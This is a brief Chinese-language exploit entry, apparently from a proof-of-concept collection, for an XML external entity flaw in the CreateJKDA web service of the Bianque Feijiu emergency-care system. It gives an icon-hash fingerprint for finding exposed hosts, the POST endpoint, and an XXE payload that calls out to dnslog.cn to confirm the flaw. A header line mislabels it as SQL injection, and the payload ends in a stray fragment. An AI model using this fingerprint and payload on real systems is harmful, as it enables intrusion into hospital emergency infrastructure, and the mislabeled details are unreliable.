# 扁鹊飞救智能急救与质控系统CreateJKDA存在XML实体注入漏洞

扁鹊飞救智能急救与质控系统 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-757866684"`
- **请求**：`POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/CreateJKDA HTTP/1.1`

**Payload**
```
requestXml=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://www.dnslog.cn"> %remote;]>
:---
```
- **响应特征**：200 dnslog回显